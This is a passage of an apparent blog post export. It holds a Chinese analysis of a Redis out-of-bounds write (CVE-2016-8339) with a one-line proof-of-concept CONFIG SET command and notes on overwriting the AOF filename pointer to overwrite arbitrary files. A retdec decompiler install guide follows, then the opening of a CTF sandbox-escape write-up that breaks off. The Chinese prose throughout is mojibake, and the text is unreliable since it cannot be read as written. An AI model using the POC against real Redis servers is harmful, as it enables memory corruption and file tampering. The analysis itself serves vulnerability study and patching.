class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;normal&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_NORMAL;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;slave&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_SLAVE;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;pubsub&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_PUBSUB;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;master&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_MASTER; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç®€å•å­—ç¬¦ä¸²ç±»å‹æ¯”è¾ƒï¼Œç„¶åè¿”å›ä¸åŒçš„å€¼ã€‚è¿”å›å€¼çš„å®šä¹‰å®å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_NORMAL 0 <span class="comment">/* Normal req-reply clients + MONITORs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_SLAVE 1  <span class="comment">/* Slaves. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_PUBSUB 2 <span class="comment">/* Clients subscribed to PubSub channels. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_MASTER 3 <span class="comment">/* Master. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_OBUF_COUNT 3 <span class="comment">/* Number of clients to expose to output</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    buffer configuration. Just the first</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    three: normal, slave, pubsub. */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå°†è¿”å›çš„å€¼æ”¾åœ¨ <code>class</code>å­—ç¬¦ä¸²ä¸­ï¼Œç„¶åç´§æ¥ç€ä½œä¸ºæ•°ç»„ä¸‹æ ‡è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">hard_limit_bytes</span> = <span class="title">hard</span>;</span></span><br><span class="line">server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_bytes</span> = <span class="title">soft</span>;</span></span><br><span class="line">server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_seconds</span> = <span class="title">soft_seconds</span>;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŸ¥çœ‹<code> server.client_obuf_limits[class]</code>çš„è§£æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clientBufferLimitsConfig client_obuf_limits[CLIENT_TYPE_OBUF_COUNT]; <span class="comment">//æ•°ç»„å¤§å°ä¸º3</span></span><br><span class="line">    <span class="comment">/* AOF persistence */</span></span><br><span class="line">    <span class="keyword">int</span> aof_state;                  <span class="comment">/* AOF_(ON|OFF|WAIT_REWRITE) */</span></span><br><span class="line">    <span class="keyword">int</span> aof_fsync;                  <span class="comment">/* Kind of fsync() policy */</span></span><br><span class="line">    <span class="keyword">char</span> *aof_filename;             <span class="comment">/* Name of the AOF file */</span></span><br><span class="line">    <span class="keyword">int</span> aof_no_fsync_on_rewrite;    <span class="comment">/* Don&#x27;t fsync if a rewrite is in prog. */</span></span><br><span class="line">    <span class="keyword">int</span> aof_rewrite_perc;           <span class="comment">/* Rewrite AOF if % growth is &gt; M and... */</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_NORMAL 0 <span class="comment">/* Normal req-reply clients + MONITORs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_SLAVE 1  <span class="comment">/* Slaves. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_PUBSUB 2 <span class="comment">/* Clients subscribed to PubSub channels. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_MASTER 3 <span class="comment">/* Master. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_OBUF_COUNT 3 <span class="comment">/* Number of clients to expose to output</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    buffer configuration. Just the first</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    three: normal, slave, pubsub. */</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>getClientTypeByName</code> å‡½æ•°è§£æå®¢æˆ·ç«¯ç±»å‹å¹¶è¿”å›ä¸€ä¸ªå€¼å­˜å‚¨åœ¨classå˜é‡ä¸­ï¼Œå®ƒçš„å–å€¼èŒƒå›´æ˜¯[-1, 3]ï¼Œæ¥ä¸‹æ¥<code>client_obuf_limits</code>ä½¿ç”¨classå˜é‡ä½œä¸ºä¸‹æ ‡å»è®¿é—®ç»“æ„ä½“æ•°ç»„å¹¶èµ‹å€¼ã€‚ç„¶è€Œä»<code>client_obuf_limits</code>çš„å®šä¹‰å¤„å¯ä»¥å‘ç°ï¼Œå®ƒçš„é•¿åº¦æ˜¯3ã€‚</p><p>è¿™å°±æ„å‘³ç€ï¼Œè¿™å­˜åœ¨ç€æ•°ç»„ä¸‹æ ‡è¶Šç•Œçš„å¯èƒ½æ€§ï¼Œç”±äºåç»­æ“ä½œæ˜¯å†™ï¼Œæ‰€ä»¥å­˜åœ¨è¶Šç•Œå†™ã€‚æˆ‘ä»¬è¿›ä¸€æ­¥æŸ¥çœ‹å…³äº<code>clientBufferLimitsConfig </code> ç»“æ„ä½“çš„å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">clientBufferLimitsConfig</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> hard_limit_bytes;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> soft_limit_bytes;</span><br><span class="line">    <span class="keyword">time_t</span> soft_limit_seconds;</span><br><span class="line">&#125; clientBufferLimitsConfig;</span><br></pre></td></tr></table></figure><p>ç»“æ„ä½“å¤§å°ä¸º 24 å­—èŠ‚ï¼Œè¿™è¯´æ˜æ”»å‡»è€…æœ€å¤šå‘client_obuf_limitsæ•°ç»„åå†™å…¥24å­—èŠ‚çš„æ•°æ®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clientBufferLimitsConfig client_obuf_limits[CLIENT_TYPE_OBUF_COUNT]; <span class="comment">//æ•°ç»„å¤§å°ä¸º3</span></span><br><span class="line">    <span class="comment">/* AOF persistence */</span></span><br><span class="line">    <span class="keyword">int</span> aof_state;                  <span class="comment">/* AOF_(ON|OFF|WAIT_REWRITE) */</span></span><br><span class="line">    <span class="keyword">int</span> aof_fsync;                  <span class="comment">/* Kind of fsync() policy */</span></span><br><span class="line">    <span class="keyword">char</span> *aof_filename;             <span class="comment">/* Name of the AOF file */</span></span><br><span class="line">    <span class="keyword">int</span> aof_no_fsync_on_rewrite;    <span class="comment">/* Don&#x27;t fsync if a rewrite is in prog. */</span></span><br><span class="line">    <span class="keyword">int</span> aof_rewrite_perc;           <span class="comment">/* Rewrite AOF if % growth is &gt; M and... */</span></span><br></pre></td></tr></table></figure><p>ç”±ä¸Šéƒ¨åˆ†å†…å®¹ï¼Œæˆ‘ä»¬å¤§æ¦‚å¯ä»¥çŸ¥é“client_obuf_limitsæ•°ç»„æ˜¯redisServerç»“æ„ä½“çš„ä¸€ä¸ªæˆå‘˜ï¼Œå®ƒçš„åé¢ç´§è·Ÿç€AOFçŠ¶æ€åŸŸï¼ˆRedis å°†æ‰€æœ‰å¯¹æ•°æ®åº“è¿›è¡Œè¿‡å†™å…¥çš„å‘½ä»¤è®°å½•åˆ° AOF æ–‡ä»¶ï¼Œ ä»¥æ­¤è¾¾åˆ°è®°å½•æ•°æ®åº“çŠ¶æ€çš„ç›®çš„)ã€‚æ”»å‡»è€…æ˜¯å¯ä»¥è¦†ç›–åˆ°è¿™äº›åŸŸå¹¶å†™å…¥æ•°æ®çš„ã€‚</p><h3 id="0x03-åˆ©ç”¨"><a href="#0x03-åˆ©ç”¨" class="headerlink" title="0x03 åˆ©ç”¨"></a>0x03 åˆ©ç”¨</h3><p>ç”±äºåªèƒ½å†™å…¥24 å­—èŠ‚çš„å†…å®¹ï¼Œæˆ‘ä»¬ä»…ä»…åªèƒ½è¦†ç›–åˆ°åé¢çš„ï¼Œåœ¨è¿™äº›åŸŸä¸­æš‚æ—¶åªçœ‹åˆ°<code>aof_filename</code>è¿™ä¸ªæŒ‡é’ˆå­˜åœ¨åˆ©ç”¨ç‚¹ã€‚</p><h4 id="what-is-AOFï¼Ÿ"><a href="#what-is-AOFï¼Ÿ" class="headerlink" title="what is AOFï¼Ÿ"></a>what is AOFï¼Ÿ</h4><p>Redis åˆ†åˆ«æä¾›äº† RDB å’Œ AOF ä¸¤ç§æŒä¹…åŒ–æœºåˆ¶ï¼š</p><ul><li>RDB å°†æ•°æ®åº“çš„å¿«ç…§ï¼ˆsnapshotï¼‰ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼ä¿å­˜åˆ°ç£ç›˜ä¸­ã€‚</li><li>AOF åˆ™ä»¥åè®®æ–‡æœ¬çš„æ–¹å¼ï¼Œå°†æ‰€æœ‰å¯¹æ•°æ®åº“è¿›è¡Œè¿‡å†™å…¥çš„å‘½ä»¤ï¼ˆåŠå…¶å‚æ•°ï¼‰è®°å½•åˆ° AOF æ–‡ä»¶ï¼Œä»¥æ­¤è¾¾åˆ°è®°å½•æ•°æ®åº“çŠ¶æ€çš„ç›®çš„ã€‚</li></ul><h4 id="AOF-doing-ï¼Ÿ"><a href="#AOF-doing-ï¼Ÿ" class="headerlink" title="AOF doing ï¼Ÿ"></a>AOF doing ï¼Ÿ</h4><p>Redis å°†æ‰€æœ‰å¯¹æ•°æ®åº“è¿›è¡Œè¿‡å†™å…¥çš„å‘½ä»¤ï¼ˆåŠå…¶å‚æ•°ï¼‰è®°å½•åˆ° AOF æ–‡ä»¶ï¼Œ ä»¥æ­¤è¾¾åˆ°è®°å½•æ•°æ®åº“çŠ¶æ€çš„ç›®çš„ï¼Œ ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œ æˆ‘ä»¬ç§°å‘¼è¿™ç§è®°å½•è¿‡ç¨‹ä¸ºåŒæ­¥ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œ å¦‚æœæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">redis&gt; RPUSH list 1 2 3 4</span><br><span class="line">(integer) 4</span><br><span class="line"></span><br><span class="line">redis&gt; LRANGE list 0 -1</span><br><span class="line">1) &quot;1&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;3&quot;</span><br><span class="line">4) &quot;4&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; KEYS *</span><br><span class="line">1) &quot;list&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; RPOP list</span><br><span class="line">&quot;4&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; LPOP list</span><br><span class="line">&quot;1&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; LPUSH list 1</span><br><span class="line">(integer) 3</span><br><span class="line"></span><br><span class="line">redis&gt; LRANGE list 0 -1</span><br><span class="line">1) &quot;1&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;3&quot;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå…¶ä¸­å››æ¡å¯¹æ•°æ®åº“æœ‰ä¿®æ”¹çš„å†™å…¥å‘½ä»¤å°±ä¼šè¢«åŒæ­¥åˆ° AOF æ–‡ä»¶ä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RPUSH list 1 2 3 4</span><br><span class="line"></span><br><span class="line">RPOP list</span><br><span class="line"></span><br><span class="line">LPOP list</span><br><span class="line"></span><br><span class="line">LPUSH list 1</span><br></pre></td></tr></table></figure><p>ä¸ºäº†å¤„ç†çš„æ–¹ä¾¿ï¼Œ AOF æ–‡ä»¶ä½¿ç”¨ç½‘ç»œé€šè®¯åè®®çš„æ ¼å¼æ¥ä¿å­˜è¿™äº›å‘½ä»¤ã€‚</p><p>æ¯”å¦‚è¯´ï¼Œ ä¸Šé¢åˆ—ä¸¾çš„å››ä¸ªå‘½ä»¤åœ¨ AOF æ–‡ä»¶ä¸­å°±å®é™…ä¿å­˜å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line">$6</span><br><span class="line">SELECT</span><br><span class="line">$1</span><br><span class="line">0</span><br><span class="line">*6</span><br><span class="line">$5</span><br><span class="line">RPUSH</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">$1</span><br><span class="line">1</span><br><span class="line">$1</span><br><span class="line">2</span><br><span class="line">$1</span><br><span class="line">3</span><br><span class="line">$1</span><br><span class="line">4</span><br><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">RPOP</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">LPOP</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">*3</span><br><span class="line">$5</span><br><span class="line">LPUSH</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">$1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>é™¤äº† <a href="http://redis.readthedocs.org/en/latest/connection/select.html#select">SELECT</a> å‘½ä»¤æ˜¯ AOF ç¨‹åºè‡ªå·±åŠ ä¸Šå»çš„ä¹‹å¤–ï¼Œ å…¶ä»–å‘½ä»¤éƒ½æ˜¯ä¹‹å‰æˆ‘ä»¬åœ¨ç»ˆç«¯é‡Œæ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p>åŒæ­¥å‘½ä»¤åˆ° AOF æ–‡ä»¶çš„æ•´ä¸ªè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p><ol><li>å‘½ä»¤ä¼ æ’­ï¼šRedis å°†æ‰§è¡Œå®Œçš„å‘½ä»¤ã€å‘½ä»¤çš„å‚æ•°ã€å‘½ä»¤çš„å‚æ•°ä¸ªæ•°ç­‰ä¿¡æ¯å‘é€åˆ° AOF ç¨‹åºä¸­ã€‚</li><li>ç¼“å­˜è¿½åŠ ï¼šAOF ç¨‹åºæ ¹æ®æ¥æ”¶åˆ°çš„å‘½ä»¤æ•°æ®ï¼Œå°†å‘½ä»¤è½¬æ¢ä¸ºç½‘ç»œé€šè®¯åè®®çš„æ ¼å¼ï¼Œç„¶åå°†åè®®å†…å®¹è¿½åŠ åˆ°æœåŠ¡å™¨çš„ AOF ç¼“å­˜ä¸­ã€‚</li><li>æ–‡ä»¶å†™å…¥å’Œä¿å­˜ï¼šAOF ç¼“å­˜ä¸­çš„å†…å®¹è¢«å†™å…¥åˆ° AOF æ–‡ä»¶æœ«å°¾ï¼Œå¦‚æœè®¾å®šçš„ AOF ä¿å­˜æ¡ä»¶è¢«æ»¡è¶³çš„è¯ï¼Œ <code>fsync</code> å‡½æ•°æˆ–è€… <code>fdatasync</code>å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œå°†å†™å…¥çš„å†…å®¹çœŸæ­£åœ°ä¿å­˜åˆ°ç£ç›˜ä¸­ã€‚</li></ol><h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p><code>aof_filename </code>è¿™ä¸ªå­—ç¬¦æŒ‡é’ˆå€¼å¾—æ³¨æ„ï¼Œé€šè¿‡ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆï¼Œåœ¨å…·ä½“çš„ç¯å¢ƒä¸‹</p><p>ï¼ˆ1ï¼‰é€šè¿‡ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆï¼Œåœ¨å…·ä½“çš„ç¯å¢ƒä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥è¾¾åˆ°åˆ©ç”¨AOFæ•°æ®è¦†å†™ä»»æ„æ–‡ä»¶çš„ç›®çš„ï¼›</p><p>ï¼ˆ2ï¼‰åŠ è½½é€šè¿‡å…¶ä»–é€”å¾„æ„é€ çš„æ¶æ„AOFæ–‡ä»¶ï¼Œæ¥è¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>config set client-output-buffer-limit &quot;master 1094795585 1094795585 1094795585&quot;</code></p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180802154400.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180802154400.png"></a></p><p>å¯ä»¥å‘ç° <strong>aof_state</strong> ã€<strong>aof_filename</strong>ã€ä»¥åŠ**aof_no_fsync_on_rewrite **è¢«è¦†å†™äº†ã€‚</p><h3 id="0x04-æ¼æ´ä¿®å¤"><a href="#0x04-æ¼æ´ä¿®å¤" class="headerlink" title="0x04 æ¼æ´ä¿®å¤"></a>0x04 æ¼æ´ä¿®å¤</h3><p>redis çš„ä¿®å¤è®°å½•ï¼š</p><p><a href="https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977">https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180727181434.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180727181434.png"></a></p><p>class çš„å€¼äº†åšäº†è¿›ä¸€æ­¥åˆ¤æ–­ã€‚</p><h3 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h3><p><a href="http://redisbook.readthedocs.io/en/latest/internal/aof.html">http://redisbook.readthedocs.io/en/latest/internal/aof.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2016-8339 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>retdecçš„å®‰è£…</title>
      <link href="mips-decompiler-retdec-install-guide.html"/>
      <url>mips-decompiler-retdec-install-guide.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ç¯å¢ƒï¼šwindows 7</p><p>IDAç‰ˆæœ¬ï¼š 7.0</p><p>åˆ†ä¸¤æ­¥èµ°ï¼š</p><h2 id="å®‰è£…retdec-ida-plugin"><a href="#å®‰è£…retdec-ida-plugin" class="headerlink" title="å®‰è£…retdec-ida-plugin"></a>å®‰è£…retdec-ida-plugin</h2><p><strong>ä¸‹è½½plugin</strong></p><p>ä» <a href="https://github.com/avast-tl/retdec-idaplugin">https://github.com/avast-tl/retdec-idaplugin</a> ä¸‹è½½retdec-idaplguin,ç”±äºæˆ‘çš„ida ç‰ˆæœ¬æ˜¯7.0 å°±æ­¤ï¼Œæˆ‘ä»¬é€‰æ‹©5.0 çš„windowsç‰ˆæœ¬ï¼ˆå¦‚æœæ˜¯ida 6.8 è¯·é€‰æ‹© 4.0ç‰ˆæœ¬ï¼‰</p><p><strong>å®‰è£…</strong></p><p>å°†ä¸‹è½½åçš„plugin å®‰è£…åˆ°idaçš„plguinç›®å½•ä¸‹ï¼š</p><h2 id="å®‰è£…-retdec-åç¼–è¯‘å·¥å…·"><a href="#å®‰è£…-retdec-åç¼–è¯‘å·¥å…·" class="headerlink" title="å®‰è£… retdec åç¼–è¯‘å·¥å…·"></a>å®‰è£… retdec åç¼–è¯‘å·¥å…·</h2><p><a href="https://github.com/avast-tl/retdec">https://github.com/avast-tl/retdec</a> å®˜æ–¹çš„githubå°±æ­¤åšäº†è¯¦ç»†è¯´æ˜ï¼Œæˆ‘è¿™é‡Œå¤§æ¦‚ç®€è¿°ä¸‹ï¼š</p><ol><li>ä¸‹è½½ retdec ,<a href="https://github.com/avast-tl/retdec/releases%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E6%98%AFida">https://github.com/avast-tl/retdec/releasesï¼Œç”±äºæˆ‘ä»¬æ˜¯ida</a> 7.0ç‰ˆæœ¬ï¼Œå°±æ­¤é€‰æ‹©<strong>v3.1</strong></li></ol><p>ï¼ˆå¦‚æœæ˜¯ida 6.8 è¯·é€‰æ‹© v3.0ç‰ˆæœ¬ï¼‰</p><ol start="2"><li><p>è§£å‹å‹ç¼©åŒ…åˆ°æŸä¸€ç›®å½•ä¸‹å³å¯</p></li><li><p>å®‰è£…Â <a href="https://www.microsoft.com/en-us/download/details.aspx?id=48145">Microsoft Visual C++ Redistributable for Visual Studio 2015</a></p></li><li><p>å®‰è£… <a href="http://www.msys2.org/">MSYS2</a> å¹¶è®¾ç½®å¥½ç¯å¢ƒå˜é‡ï¼ˆPathä¸‹ï¼‰</p></li><li><p>åœ¨ ida çš„ èœå•æ ä¸­ï¼Œé€‰æ‹© option-&gt;Retdec plguin option</p></li></ol><p>   <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/retdec-hotkey.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/retdec-hotkey.jpg"></a></p><p>å°±æ­¤å°±å¯ä»¥ä½¿ç”¨äº†å•¦~ æ’’èŠ±</p><h2 id="å°å»ºè®®"><a href="#å°å»ºè®®" class="headerlink" title="å°å»ºè®®"></a>å°å»ºè®®</h2><p>IDA 6.8 é… v3.0 + retdec-plugin-4.0ç‰ˆæœ¬é£Ÿç”¨æ•ˆæœæœ€ä½³ã€‚æ¯”è¾ƒæ¨èè¿™ä¸ªç‰ˆæœ¬çš„é…ç½®ã€‚</p><h2 id="2019-01-13-æ›´æ–°"><a href="#2019-01-13-æ›´æ–°" class="headerlink" title="2019-01-13 æ›´æ–°"></a>2019-01-13 æ›´æ–°</h2><p>åœ¨å…ˆçŸ¥çœ‹åˆ°æœ‰äººå¼•ç”¨æˆ‘äº†æˆ‘çš„åšå®¢ï¼Œæ‰€ä»¥æˆ‘åšä¸€ä¸ªæ›´æ–°</p><p><a href="https://github.com/avast-tl/retdec-idaplugin">https://github.com/avast-tl/retdec-idaplugin</a> ä¸­çš„ retdec-idaplugin å·²ç»æ›´æ–°åˆ°äº† v7.0</p><p><a href="/Users/swing/Desktop/Blog/hexo/source/_posts/20190114000321.png" class="gallery-item"><img src="/Users/swing/Desktop/Blog/hexo/source/_posts/20190114000321.png"></a></p><p>ç¬¬ä¸€æ­¥ ï¼Œä¾ç„¶æ˜¯å°† ida plugin å®‰è£…åˆ°ç›¸åº”ç›®å½•é‡Œ</p><p>ç¬¬äºŒæ­¥ï¼Œä¸‹è½½ retdec</p><p>retdec æ›´æ–°åˆ° 3.2 ç‰ˆæœ¬äº†ã€‚</p><p>ç°åœ¨ä¸ä»¥å‰ä¸åŒçš„æ˜¯ï¼Œç°åœ¨é‡‡ç”¨äº† Python è„šæœ¬ï¼Œå·²ç»ä¸éœ€è¦ä»¥å‰é‚£äº›ç¹ççš„å·¥ä½œäº†ï¼Œåªè¦è®¾ç½®å¥½Python Path å°±è¡Œäº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114002929.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114002929.png"></a></p><p>å¹¶ä¸”ï¼Œæ˜¯å¾— Py3 ï¼Œè®¾ç½®å¥½ decompiler è·¯å¾„ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114003450.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114003450.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> retdec </tag>
            
            <tag> mips </tag>
            
            <tag> decompiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 é“äººä¸‰é¡¹ è¥¿åŒ—èµ›åŒº easyformat</title>
      <link href="2018-t3sec-Northwest-Division.html"/>
      <url>2018-t3sec-Northwest-Division.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>æ”¾äº†å¥½ä¹…äº† ä¸€ç›´æ²¡å†™,,,</p><h2 id="easyformat"><a href="#easyformat" class="headerlink" title="easyformat"></a>easyformat</h2><p>è¿™ä¸ªé¢˜å½“æ—¶ç°åœºæ˜¯æ²¡äººåšå‡ºæ¥çš„ï¼Œå…¨å›½å¬è¯´ä¹Ÿåªæœ‰ä¸¤äººâ€¦</p><p>è¿™æ˜¯ä¸€ä¸ªæ²™ç®±é€ƒé€¸é¢˜ï¼Œchrootäº† éœ€è¦é€ƒé€¸å‡ºæ¥â€¦</p><p>æ€è·¯æ˜¯ï¼š</p><p>é¦–å…ˆé€šè¿‡fmt è¿›è¡ŒæŒ‡é’ˆåŠ«æŒï¼Œç„¶åæ„é€ ropï¼Œåˆ›å»ºä¸€æ®µå¯ä»¥ shellcodeçš„ç©ºé—´ã€‚ä¹‹åé€šè¿‡ <strong>ptrace</strong>å»é™„åŠ çˆ¶è¿›ç¨‹ã€‚</p><p>Ps: <a href="https://github.com/WinMin/Swings/tree/master/libformatstr">libformatstr Pythonåº“åœ°å€</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 